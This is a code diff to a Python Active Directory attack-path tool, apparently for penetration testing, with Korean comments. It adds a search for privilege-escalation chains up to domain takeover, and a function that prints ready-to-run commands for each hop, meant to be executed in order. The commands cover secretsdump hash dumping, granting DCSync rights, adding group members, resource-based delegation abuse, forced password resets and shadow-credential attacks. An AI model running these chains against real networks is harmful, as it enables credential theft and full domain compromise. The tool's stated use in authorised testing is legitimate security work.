@@ -648,12 +648,12 @@ def analyze_ad(sid_map, nodes):
     edges = {}   # edge_key -> [ {principal, principal_sid, target, target_type, lowpriv, inherited} ]
     props = {}   # prop_key -> [ {name, extra} ]
 
-    def add_edge(key, principal_sid, target_name, target_type, inherited):
+    def add_edge(key, principal_sid, target_name, target_type, inherited, target_sid=""):
         pname = _resolve(principal_sid, sid_map)
         lowpriv = any(tok in pname.upper() for tok in LOWPRIV_PRINCIPALS)
         edges.setdefault(key, []).append({
             "principal": pname, "principal_sid": principal_sid,
-            "target": target_name, "target_type": target_type,
+            "target": target_name, "target_type": target_type, "target_sid": target_sid,
             "lowpriv": lowpriv, "inherited": inherited,
         })
 
@@ -668,6 +668,7 @@ def analyze_ad(sid_map, nodes):
 
     for obj in all_objs:
         tname = obj.get("_name", "")
+        tsid = obj.get("_sid", "")
         ttype = obj.get("_type", "").rstrip("s")
         is_gpo = obj.get("_type") == "gpos"
         is_domain = obj.get("_type") == "domains"
@@ -682,7 +683,7 @@ def analyze_ad(sid_map, nodes):
 
             # DCSync 조각 누적
             if rl in DCSYNC_RIGHTS and is_domain:
-                dcsync_acc.setdefault((psid, tname), set()).add(rl)
+                dcsync_acc.setdefault((psid, tsid, tname), set()).add(rl)
                 continue
 
             key = RIGHT_ALIASES.get(rl)
@@ -691,7 +692,7 @@ def analyze_ad(sid_map, nodes):
             # GPO 대상 쓰기 -> GPO 악용 엣지로 분류
             if is_gpo and key in GPO_WRITE_RIGHTS:
                 key = "GpLink_GPO"
-            add_edge(key, psid, tname, ttype, inh)
+            add_edge(key, psid, tname, ttype, inh, tsid)
 
         # 위임 속성
         if obj.get("AllowedToDelegate"):
@@ -712,13 +713,13 @@ def analyze_ad(sid_map, nodes):
             add_prop("PasswordNotRequired", tname)
 
     # DCSync 확정 (GetChanges + GetChangesAll 동시 보유)
-    for (psid, dom), rights in dcsync_acc.items():
+    for (psid, dsid, dom), rights in dcsync_acc.items():
         if {"getchanges", "getchangesall"} <= rights:
             pname = _resolve(psid, sid_map)
             lowpriv = any(tok in pname.upper() for tok in LOWPRIV_PRINCIPALS)
             edges.setdefault("DCSync", []).append({
                 "principal": pname, "principal_sid": psid,
-                "target": dom, "target_type": "domain",
+                "target": dom, "target_type": "domain", "target_sid": dsid,
                 "lowpriv": lowpriv, "inherited": False,
             })
 
@@ -754,6 +755,139 @@ def analyze_lateral(sid_map, nodes, belongs):
                     "computer": cname, "owned": owned, "lowpriv": lowpriv,
                 })
     return lateral
+
+
+# 대상을 "장악"하게 해 주는 권한(=경로 확장 가능). WriteSPN 은 크랙 전제라 제외.
+TAKEOVER_RIGHTS = {
+    "GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "Owns",
+    "ForceChangePassword", "AddMember", "AllExtendedRights",
+    "AddKeyCredentialLink", "AddAllowedToAct", "WriteAccountRestrictions",
+}
+# 도메인 객체에 대해 DCSync 를 스스로 부여할 수 있게 하는 권한
+DOMAIN_TAKE_RIGHTS = {"GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "Owns"}
+
+
+def _hop_cmds(right, ttype, target):
+    """체인 한 홉의 대표 명령(치환 토큰 corp.local/dc01/attacker/Passw0rd! 사용)."""
+    sam = (target or "").split("@")[0]          # NAME@DOMAIN -> NAME (sAMAccountName)
+    if right == "DCSync" or ttype == "domain":
+        if right == "DCSync":
+            return ["impacket-secretsdump 'corp.local/attacker:Passw0rd!'@dc01 -just-dc"]
+        return [
+            "# attacker 에게 DCSync(복제) 권한을 부여한 뒤 전체 해시 덤프",
+            "PowerView> Add-DomainObjectAcl -TargetIdentity 'corp.local' -PrincipalIdentity attacker -Rights DCSync",
+            "impacket-dacledit -action write -rights DCSync -principal attacker -target-dn 'DC=corp,DC=local' 'corp.local/attacker:Passw0rd!'",
+            "impacket-secretsdump 'corp.local/attacker:Passw0rd!'@dc01 -just-dc",
+        ]
+    if ttype == "group":
+        return [
+            f"net rpc group addmem '{sam}' attacker -U 'corp.local/attacker%Passw0rd!' -S dc01",
+            f"PowerView> Add-DomainGroupMember -Identity '{sam}' -Members attacker",
+            f"bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 add groupMember '{sam}' attacker",
+        ]
+    if ttype == "computer":
+        host = sam.split(".")[0] + "$"
+        return [f"impacket-rbcd -delegate-from 'ATTACKERPC$' -delegate-to '{host}' -action write 'corp.local/attacker:Passw0rd!'"]
+    # user
+    if right in ("ForceChangePassword", "GenericAll", "AllExtendedRights"):
+        return [f"net rpc password '{sam}' 'NewPass123!' -U 'corp.local/attacker%Passw0rd!' -S dc01"]
+    return [f"certipy shadow auto -u attacker@corp.local -p 'Passw0rd!' -account '{sam}'"]
+
+
+def find_attack_paths(edges, sid_map, nodes, owned_sids, max_paths=4, max_nodes=6000):
+    """owned(또는 저권한) 에서 소속그룹 + ACL 엣지를 타고 도메인 장악(DCSync)/
+    특권그룹까지의 최단 경로를 BFS 로 탐색. 반환: [ [hop, ...], ... ]"""
+    # ACL 인접: principal_sid -> [(right, target_sid, target_name, target_type)]
+    adj = {}
+    for k, insts in edges.items():
+        for e in insts:
+            adj.setdefault(e["principal_sid"], []).append(
+                (k, e.get("target_sid", ""), e["target"], e["target_type"]))
+    # 그룹 멤버십: sid -> 직접 소속 그룹 sid 집합
+    memberof = {}
+    for g in nodes["groups"]:
+        gsid = g.get("_sid")
+        for m in _ace_members(g.get("Members")):
+            memberof.setdefault(m, set()).add(gsid)
+
+    domain_sids = {o.get("_sid") for o in nodes["domains"] if o.get("_sid")}
+
+    def hv_group(sid):   # 최종 목표가 되는 특권 그룹
+        info = sid_map.get(sid)
+        if not info:
+            return False
+        up = info["name"].upper()
+        return any(t in up for t in ("DOMAIN ADMINS", "ENTERPRISE ADMINS", "ADMINISTRATORS"))
+
+    start = set(s for s in owned_sids if s)
+    if not start:  # owned 미지정 -> 저권한(누구나) 주체에서 시작
+        for sid, info in sid_map.items():
+            if any(t in info["name"].upper() for t in LOWPRIV_PRINCIPALS):
+                start.add(sid)
+    if not start:
+        return []
+
+    from collections import deque
+    visited = set(start)
+    pred = {}          # sid -> (prev_sid, label, target_type)
+    dq = deque(start)
+    goals = []
+    steps = 0
+    while dq and steps < max_nodes:
+        node = dq.popleft()
+        steps += 1
+        # 1) 멤버십(소속 그룹의 권한을 상속) - 공격 아님
+        for g in memberof.get(node, ()):
+            if g not in visited:
+                visited.add(g)
+                pred[g] = (node, "MemberOf", "group")
+                dq.append(g)
+                if hv_group(g):
+                    goals.append(g)
+        # 2) ACL 엣지(대상 장악)
+        for (right, tsid, tname, ttype) in adj.get(node, []):
+            is_dom = (ttype == "domain") or (tsid in domain_sids)
+            if right == "DCSync" or (is_dom and right in DOMAIN_TAKE_RIGHTS):
+                gid = ("DOMAIN", tsid or tname)
+                if gid not in pred:
+                    pred[gid] = (node, right, "domain")
+                    goals.append(gid)
+                continue
+            if not tsid or tsid in visited:
+                continue
+            if right in TAKEOVER_RIGHTS:
+                visited.add(tsid)
+                pred[tsid] = (node, right, ttype)
+                dq.append(tsid)
+                if hv_group(tsid):
+                    goals.append(tsid)
+
+    # 경로 복원 (짧은 것 우선, 중복 제거)
+    paths, seen = [], set()
+    for goal in goals:
+        hops, cur, guard = [], goal, 0
+        while cur in pred and guard < 64:
+            prev, label, ttype = pred[cur]
+            if isinstance(cur, tuple):     # ("DOMAIN", x)
+                cur_name = _resolve(cur[1], sid_map) if cur[1] in sid_map else (cur[1] or "도메인")
+                cur_type = "domain"
+            else:
+                cur_name, cur_type = _resolve(cur, sid_map), ttype
+            hops.append({"frm_sid": prev, "frm": _resolve(prev, sid_map),
+                         "label": label, "to": cur_name, "to_type": cur_type})
+            cur = prev
+            guard += 1
+        hops.reverse()
+        if not hops:
+            continue
+        key = tuple((h["frm"], h["label"], h["to"]) for h in hops)
+        if key in seen:
+            continue
+        seen.add(key)
+        paths.append(hops)
+
+    paths.sort(key=len)
+    return paths[:max_paths]
 
 
 def _edge_priority(ad_db, key):
@@ -1028,6 +1162,32 @@ def print_ad_report(edges, props, ad_db, sid_map, nodes, ctx=None):
                 else:
                     print(f"       {C.GREEN}$ {cc}{C.RESET}")
 
+    # ===== 도메인 장악 경로(체인) — 최하단, 가장 중요한 근거 =====
+    paths = ctx.get("paths", [])
+    if paths:
+        print(f"\n{C.RED}{C.BOLD}{'='*74}{C.RESET}")
+        who = f" (시작: {', '.join(owned_names)})" if owned_names else " (시작: 저권한 사용자)"
+        print(f"{C.RED}{C.BOLD} 🎯 도메인 장악 경로 (엣지 체이닝){who}{C.RESET}")
+        print(f"{C.RED}{C.BOLD}{'='*74}{C.RESET}")
+        print(f"  {C.GREY}개별 엣지를 이어붙인 실제 공격 경로. 위에서 아래로 순서대로 실행.{C.RESET}")
+        for pi, hops in enumerate(paths, 1):
+            start_name = hops[0]["frm"] if hops else "?"
+            n_attack = sum(1 for h in hops if h["label"] != "MemberOf")
+            print(f"\n  {C.BOLD}[경로 {pi}] {n_attack}단계 공격{C.RESET}  "
+                  f"{C.CYAN}{start_name}{C.RESET}{C.GREY} → ... → 도메인 장악{C.RESET}")
+            for h in hops:
+                if h["label"] == "MemberOf":
+                    print(f"      {C.GREY}└ (MemberOf) →{C.RESET} {C.CYAN}{h['to']}{C.RESET}")
+                else:
+                    dom = " ⇒ DCSync" if h["to_type"] == "domain" else ""
+                    print(f"      {C.RED}└ ({h['label']}) →{C.RESET} "
+                          f"{C.BOLD}{h['to']}{C.RESET} {C.GREY}[{h['to_type']}]{C.RESET}{C.RED}{C.BOLD}{dom}{C.RESET}")
+                    for c in _hop_cmds(h["label"], h["to_type"], h["to"]):
+                        cc = _sub(c, subs)
+                        col = C.GREY if cc.strip().startswith("#") else C.GREEN
+                        pre = "" if cc.strip().startswith("#") else "$ "
+                        print(f"          {col}{pre}{cc}{C.RESET}")
+
     print(f"\n{C.DIM}[안내] PETS AD 모드는 인가된 모의해킹/실습용입니다. "
           f"비번 리셋 등은 운영 계정 잠금 위험이 있으니 대상 권한을 확인하고 사용하세요.{C.RESET}\n")
 
@@ -1047,6 +1207,12 @@ def build_ad_json(edges, props, ctx=None):
                 if e["principal_sid"] in ctx["belongs"]
             ],
         }
+    if ctx and ctx.get("paths"):
+        out["attack_paths"] = [
+            [{"from": h["frm"], "edge": h["label"], "to": h["to"], "to_type": h["to_type"]}
+             for h in hops]
+            for hops in ctx["paths"]
+        ]
     return out
 
 
@@ -1138,9 +1304,10 @@ def _run_ad(args):
     owned_names, owned_sids, belongs, not_found = resolve_owned(owned_args, sid_map, nodes)
     subs = build_subs(owned_args, args.domain, args.dc, nodes, sid_map)
     lateral = analyze_lateral(sid_map, nodes, belongs)
+    paths = find_attack_paths(edges, sid_map, nodes, owned_sids)
     ctx = {"owned_names": owned_names, "owned_sids": owned_sids,
            "belongs": belongs, "not_found": not_found, "subs": subs,
-           "show_privileged": args.show_privileged, "lateral": lateral}
+           "show_privileged": args.show_privileged, "lateral": lateral, "paths": paths}
 
     print_ad_report(edges, props, ad_db, sid_map, nodes, ctx)
     if args.json:
